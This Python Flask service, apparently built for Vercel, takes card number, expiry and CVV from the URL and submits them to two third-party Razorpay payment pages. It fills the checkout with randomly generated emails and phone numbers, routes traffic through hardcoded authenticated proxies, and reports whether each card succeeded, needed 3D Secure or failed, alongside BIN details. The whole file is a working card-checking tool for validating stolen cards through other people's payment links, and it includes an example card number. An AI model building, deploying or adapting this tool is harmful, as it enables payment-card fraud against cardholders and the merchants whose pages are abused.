from flask import Flask, request, jsonify
import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
from urllib.parse import quote
import os

urllib3.disable_warnings()

app = Flask(__name__)

# Configuration for Vercel
MAX_RETRIES = 2

# Only 2 payment pages
PAYMENT_PAGES = [
    "https://razorpay.me/@innatemind",
    "https://razorpay.me/@iiecm"
]

# Proxies (Vercel mein limited support)
PROXY_LIST_RAW = [
    "38.154.203.95:5863:wdafupmw:gep9pikf53l7",
    "198.105.121.200:6462:wdafupmw:gep9pikf53l7",
    "64.137.96.74:6641:wdafupmw:gep9pikf53l7",
]

def parse_proxy(proxy_string):
    try:
        parts = proxy_string.split(':')
        if len(parts) == 4:
            host, port, username, password = parts
            proxy_url = f"http://{username}:{password}@{host}:{port}"
            return {"http": proxy_url, "https": proxy_url}
    except:
        pass
    return None

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    else: return "unknown"

def get_bin_details(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        if response.status_code == 200:
            bin_data = response.json()
            return {
                "scheme": bin_data.get("scheme", "unknown"),
                "type": bin_data.get("type", "unknown"),
                "brand": bin_data.get("brand", "unknown"),
                "country": bin_data.get("country", {}).get("name", "unknown"),
                "bank": bin_data.get("bank", {}).get("name", "unknown")
            }
    except:
        pass
    return {"scheme": "unknown", "type": "unknown", "brand": "unknown", "country": "unknown", "bank": "unknown"}

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
    return f"{username}@gmail.com"

def generate_random_phone():
    return f"+91{''.join(random.choices(string.digits, k=10))}"

@app.route('/razorpay/<path:cc_data>', methods=['GET', 'POST'])
def process_payment(cc_data):
    try:
        # Handle URL encoded pipe
        cc_data = cc_data.replace('%7C', '|')
        
        cc_parts = cc_data.split("|")
        if len(cc_parts) < 4:
            return jsonify({
                "status": "error",
                "message": f"Invalid format. Use: card|mm|yy|cvv. Received: {cc_data}"
            }), 400
        
        cc = cc_parts[0].strip()
        mm = cc_parts[1].strip().zfill(2)
        yy = cc_parts[2].strip()[-2:]
        cvv = cc_parts[3].strip()
        year = int("20" + yy)
        
        amount = int(request.args.get('amount', 100))
        email = request.args.get('email', generate_random_email())
        phone = request.args.get('phone', generate_random_phone())
        
        # Get BIN details
        bin_details = get_bin_details(cc[:8])
        
        # Create session
        session = requests.Session()
        session.verify = False
        
        # Try proxy if available
        for proxy_str in PROXY_LIST_RAW[:2]:  # Limit proxies for Vercel
            proxy_dict = parse_proxy(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
                try:
                    test = session.get("https://api.razorpay.com/v1/checkout/public", timeout=5)
                    if test.status_code == 200:
                        break
                except:
                    continue
        
        # Try both payment pages
        for url in PAYMENT_PAGES:
            try:
                print(f"Trying: {url}")
                
                brand = get_card_brand(cc)
                h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
                ts = str(int(time.time() * 1000))
                rnd = str(random.randrange(10**8)).zfill(8)
                rzp_device_id = f"1.{h}.{ts}.{rnd}"
                BASE62 = string.ascii_letters + string.digits
                rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
                ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
                BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
                
                # Get initial page data
                resp_init = session.get(url, timeout=30)
                if resp_init.status_code != 200:
                    continue
                
                # Try multiple patterns to extract data
                data = None
                patterns = [
                    r'var data = ({.*?});',
                    r'window\.__INITIAL_STATE__\s*=\s*({.*?});',
                    r'payment_link["\']?\s*:\s*({.*?})'
                ]
                
                for pattern in patterns:
                    json_match = re.search(pattern, resp_init.text, re.DOTALL)
                    if json_match:
                        try:
                            data = json.loads(json_match.group(1))
                            break
                        except:
                            continue
                
                if not data:
                    continue
                
                # Extract payment info
                kyid = data.get("key_id") or data.get("keyId")
                plink = data.get("payment_link", {}).get("id")
                ppid = data.get("payment_link", {}).get("payment_page_items", [{}])[0].get("id")
                keyless_header = data.get("keyless_header", "")
                
                if not kyid or not plink:
                    continue
                
                # Create order
                headers_order = {
                    'Accept': 'application/json, text/plain, */*',
                    'Content-Type': 'application/json',
                    'Origin': 'https://pages.razorpay.com',
                    'Referer': 'https://pages.razorpay.com/',
                    'User-Agent': ua,
                }
                
                json_order = {
                    'line_items': [{'payment_page_item_id': ppid, 'amount': amount}],
                    'notes': {
                        'membership_id': 'Hsjwj',
                        'member_name': 'Sam altamn',
                        'email': email,
                        'contact_number': phone,
                    },
                }
                
                resp_order = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", 
                                          headers=headers_order, json=json_order, timeout=30)
                
                if resp_order.status_code != 200:
                    continue
                
                order_data = json.loads(resp_order.text)
                order_id = order_data["order"]["id"]
                
                # Get session token
                params_public = {
                    'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                    'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                    'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
                }
                
                resp_public = session.get('https://api.razorpay.com/v1/checkout/public', 
                                          params=params_public, headers={'User-Agent': ua}, timeout=30)
                
                sessid = find_between(resp_public.text, 'window.session_token="', '";')
                if not sessid:
                    m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
                    if m: 
                        sessid = m.group(1)
                
                if not sessid:
                    continue
                
                # Create payment
                headers_create = {
                    'Accept': '*/*', 
                    'Content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': ua, 
                    'x-session-token': sessid,
                }
                
                params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
                
                data_create = {
                    'email': email,
                    'contact': phone, 
                    'amount': amount,
                    'currency': 'INR',
                    'order_id': order_id, 
                    'method': 'card', 
                    'card[number]': cc,
                    'card[cvv]': cvv, 
                    'card[name]': 'Hell King', 
                    'card[expiry_month]': mm, 
                    'card[expiry_year]': year,
                    'save_card': '0',
                    'key_id': kyid,
                }
                
                resp_create = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax', 
                                           params=params_create, headers=headers_create, data=data_create, 
                                           timeout=30)
                
                if not resp_create.text:
                    continue
                
                pay_json = json.loads(resp_create.text)
                payment_id = pay_json.get("payment_id") or pay_json.get("id")
                
                # Prepare response
                response_data = {
                    "amount": amount,
                    "card_details": {
                        "bin": cc[:6],
                        "last4": cc[-4:],
                        "scheme": bin_details["scheme"],
                        "type": bin_details["type"],
                        "brand": bin_details["brand"],
                        "country": bin_details["country"],
                        "bank": bin_details["bank"]
                    }
                }
                
                # Check for 3DS
                if pay_json.get("redirect") == True or pay_json.get("type") == "redirect":
                    response_data["status"] = "3ds_required"
                    response_data["message"] = "3D Secure OTP required - Check your bank app"
                elif "error" in pay_json:
                    response_data["status"] = "failed"
                    response_data["message"] = pay_json["error"].get("description", "Payment failed")
                    response_data["reason"] = pay_json["error"].get("reason", "unknown")
                else:
                    response_data["status"] = "success"
                    response_data["message"] = "Payment processed successfully"
                
                if payment_id:
                    response_data["payment_id"] = payment_id
                if order_id:
                    response_data["order_id"] = order_id
                
                return jsonify(response_data)
                
            except Exception as e:
                print(f"Error with {url}: {str(e)}")
                continue
        
        return jsonify({
            "status": "error",
            "message": "All payment pages failed. Please try again.",
            "amount": amount
        }), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/bin/<bin_number>', methods=['GET'])
def get_bin_info(bin_number):
    bin_details = get_bin_details(bin_number[:8])
    return jsonify(bin_details)

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "environment": "vercel",
        "pages": len(PAYMENT_PAGES)
    })

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Razorpay Payment API",
        "version": "Vercel Deployment",
        "endpoint": "/razorpay/card|mm|yy|cvv",
        "bin_lookup": "/bin/<bin_number>",
        "health": "/health",
        "example": "/razorpay/4744840015419148%7C03%7C31%7C976",
        "note": "Use %7C instead of | for pipe symbol in URL"
    })

# Vercel requires this
app = app

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
